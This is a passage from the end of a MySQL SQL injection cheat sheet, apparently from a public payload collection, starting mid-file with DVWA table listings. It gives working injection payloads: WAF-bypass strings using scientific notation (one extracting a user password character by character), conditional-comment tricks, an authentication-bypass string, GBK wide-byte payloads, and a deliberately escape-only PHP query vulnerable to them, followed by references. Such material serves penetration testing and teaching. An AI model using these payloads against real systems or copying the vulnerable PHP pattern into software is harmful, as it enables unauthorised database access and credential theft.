  \nmysql> SHOW TABLES IN dvwa;\n+----------------+\n| Tables_in_dvwa |\n+----------------+\n| guestbook      |\n| users \
  \         |\n+----------------+\n```\n\n### Alternative to VERSION\n\n```sql\nmysql> SELECT @@innodb_version;\n+------------------+\n\
  | @@innodb_version |\n+------------------+\n| 5.6.31           |\n+------------------+\n\nmysql> SELECT @@version;\n+-------------------------+\n\
  | @@version               |\n+-------------------------+\n| 5.6.31-0ubuntu0.15.10.1 |\n+-------------------------+\n\nmysql>\
  \ SELECT version();\n+-------------------------+\n| version()               |\n+-------------------------+\n| 5.6.31-0ubuntu0.15.10.1\
  \ |\n+-------------------------+\n\nmysql> SELECT @@GLOBAL.VERSION;\n+------------------+\n| @@GLOBAL.VERSION |\n+------------------+\n\
  | 8.0.27           |\n+------------------+\n```\n\n### Alternative to GROUP_CONCAT\n\nRequirement: `MySQL >= 5.7.22`\n\n\
  Use `json_arrayagg()` instead of `group_concat()` which allows less symbols to be displayed\n\n* `group_concat()` = 1024\
  \ symbols\n* `json_arrayagg()` > 16,000,000 symbols\n\n```sql\nSELECT json_arrayagg(concat_ws(0x3a,table_schema,table_name))\
  \ from INFORMATION_SCHEMA.TABLES;\n```\n\n### Scientific Notation\n\nIn MySQL, the e notation is used to represent numbers\
  \ in scientific notation. It's a way to express very large or very small numbers in a concise format. The e notation consists\
  \ of a number followed by the letter e and an exponent.\nThe format is: `base 'e' exponent`.\n\nFor example:\n\n* `1e3`\
  \ represents `1 x 10^3` which is `1000`.\n* `1.5e3` represents `1.5 x 10^3` which is `1500`.\n* `2e-3` represents `2 x 10^-3`\
  \ which is `0.002`.\n\nThe following queries are equivalent:\n\n* `SELECT table_name FROM information_schema 1.e.tables`\n\
  * `SELECT table_name FROM information_schema .tables`\n\nIn the same way, the common payload to bypass authentication `'\
  \ or ''='` is equivalent to `' or 1.e('')='` and `1' or 1.e(1) or '1'='1`.\nThis technique can be used to obfuscate queries\
  \ to bypass WAF, for example: `1.e(ascii 1.e(substring(1.e(select password from users limit 1 1.e,1 1.e) 1.e,1 1.e,1 1.e)1.e)1.e)\
  \ = 70 or'1'='2`\n\n### Conditional Comments\n\nMySQL conditional comments are enclosed within `/*! ... */` and can include\
  \ a version number to specify the minimum version of MySQL that should execute the contained code.\nThe code inside this\
  \ comment will be executed only if the MySQL version is greater than or equal to the number immediately following the `/*!`.\
  \ If the MySQL version is less than the specified number, the code inside the comment will be ignored.\n\n* `/*!12345UNION*/`:\
  \ This means that the word UNION will be executed as part of the SQL statement if the MySQL version is 12.345 or higher.\n\
  * `/*!31337SELECT*/`: Similarly, the word SELECT will be executed if the MySQL version is 31.337 or higher.\n\n**Examples**:\
  \ `/*!12345UNION*/`, `/*!31337SELECT*/`\n\n### Wide Byte Injection (GBK)\n\nWide byte injection is a specific type of SQL\
  \ injection attack that targets applications using multi-byte character sets, like GBK or SJIS. The term \"wide byte\" refers\
  \ to character encodings where one character can be represented by more than one byte. This type of injection is particularly\
  \ relevant when the application and the database interpret multi-byte sequences differently.\n\nThe `SET NAMES gbk` query\
  \ can be exploited in a charset-based SQL injection attack. When the character set is set to GBK, certain multibyte characters\
  \ can be used to bypass the escaping mechanism and inject malicious SQL code.\n\nSeveral characters can be used to trigger\
  \ the injection.\n\n* `%bf%27`: This is a URL-encoded representation of the byte sequence `0xbf27`. In the GBK character\
  \ set, `0xbf27` decodes to a valid multibyte character followed by a single quote ('). When MySQL encounters this sequence,\
  \ it interprets it as a single valid GBK character followed by a single quote, effectively ending the string.\n* `%bf%5c`:\
  \ Represents the byte sequence `0xbf5c`. In GBK, this decodes to a valid multi-byte character followed by a backslash (`\\\
  `). This can be used to escape the next character in the sequence.\n* `%a1%27`: Represents the byte sequence `0xa127`. In\
  \ GBK, this decodes to a valid multi-byte character followed by a single quote (`'`).\n\nA lot of payloads can be created\
  \ such as:\n\n```sql\n%A8%27 OR 1=1;--\n%8C%A8%27 OR 1=1--\n%bf' OR 1=1 -- --\n```\n\nHere is a PHP example using GBK encoding\
  \ and filtering the user input to escape backslash, single and double quote.\n\n```php\nfunction check_addslashes($string)\n\
  {\n    $string = preg_replace('/'. preg_quote('\\\\') .'/', \"\\\\\\\\\\\\\", $string);          //escape any backslash\n\
  \    $string = preg_replace('/\\'/i', '\\\\\\'', $string);                               //escape single quote with a backslash\n\
  \    $string = preg_replace('/\\\"/', \"\\\\\\\"\", $string);                                //escape double quote with\
  \ a backslash\n      \n    return $string;\n}\n\n$id=check_addslashes($_GET['id']);\nmysql_query(\"SET NAMES gbk\");\n$sql=\"\
  SELECT * FROM users WHERE id='$id' LIMIT 0,1\";\nprint_r(mysql_error());\n```\n\nHere's a breakdown of how the wide byte\
  \ injection works:\n\nFor instance, if the input is `?id=1'`, PHP will add a backslash, resulting in the SQL query: `SELECT\
  \ * FROM users WHERE id='1\\'' LIMIT 0,1`.\n\nHowever, when the sequence `%df` is introduced before the single quote, as\
  \ in `?id=1%df'`, PHP still adds the backslash. This results in the SQL query: `SELECT * FROM users WHERE id='1%df\\'' LIMIT\
  \ 0,1`.\n\nIn the GBK character set, the sequence `%df%5c` translates to the character `連`. So, the SQL query becomes: `SELECT\
  \ * FROM users WHERE id='1連'' LIMIT 0,1`. Here, the wide byte character `連` effectively \"eating\" the added escape character,\
  \ allowing for SQL injection.\n\nTherefore, by using the payload `?id=1%df' and 1=1 --+`, after PHP adds the backslash,\
  \ the SQL query transforms into: `SELECT * FROM users WHERE id='1連' and 1=1 --+' LIMIT 0,1`. This altered query can be successfully\
  \ injected, bypassing the intended SQL logic.\n\n## References\n\n* [[SQLi] Extracting data without knowing columns names\
  \ - Ahmed Sultan - February 9, 2019](https://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/)\n* [A\
  \ Scientific Notation Bug in MySQL left AWS WAF Clients Vulnerable to SQL Injection - Marc Olivier Bergeron - October 19,\
  \ 2021](https://web.archive.org/web/20211019152624/https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/)\n\
  * [Alternative for Information_Schema.Tables in MySQL - Osanda Malith Jayathissa - February 3, 2017](https://web.archive.org/web/20260227032450/https://osandamalith.com/2017/02/03/alternative-for-information_schema-tables-in-mysql/)\n\
  * [Ekoparty CTF 2016 (Web 100) - p4-team - October 26, 2016](https://github.com/p4-team/ctf/tree/master/2016-10-26-ekoparty/web_100)\n\
  * [Error Based Injection | NetSPI SQL Injection Wiki - NetSPI - February 15, 2021](https://web.archive.org/web/20210215172533/https://sqlwiki.netspi.com/injectionTypes/errorBased/)\n\
  * [How to Use SQL Calls to Secure Your Web Site - IPA ISEC - January 18, 2024](https://web.archive.org/web/20240118024024/https://www.ipa.go.jp/security/vuln/ps6vr70000011hc4-att/000017321.pdf)\n\
  * [MySQL Out of Band Hacking - Osanda Malith Jayathissa - February 23, 2018](https://web.archive.org/web/20260303030701/https://www.exploit-db.com/docs/english/41273-mysql-out-of-band-hacking.pdf)\n\
  * [SQL injection - The oldschool way - 02 - Ahmed Sultan - January 1, 2025](https://web.archive.org/web/20250807062504/https://www.youtube.com/watch?si=kFQkvCEn2NiWLDGY&v=u91EdO1cDak&feature=youtu.be)\n\
  * [SQL Truncation Attack - Rohit Shaw - June 29, 2014](https://web.archive.org/web/20201001181524/https://resources.infosecinstitute.com/sql-truncation-attack/)\n\
  * [SQLi filter evasion cheat sheet (MySQL) - Johannes Dahse - December 4, 2010](https://web.archive.org/web/20101209155346/http://websec.wordpress.com:80/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql)\n\
  * [The SQL Injection Knowledge Base - Roberto Salgado - May 29, 2013](https://websec.ca/kb/sql_injection#MySQL_Default_Databases)"
_relative_path: SQL Injection/MySQL Injection.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/SQL Injection/MySQL Injection.md
````
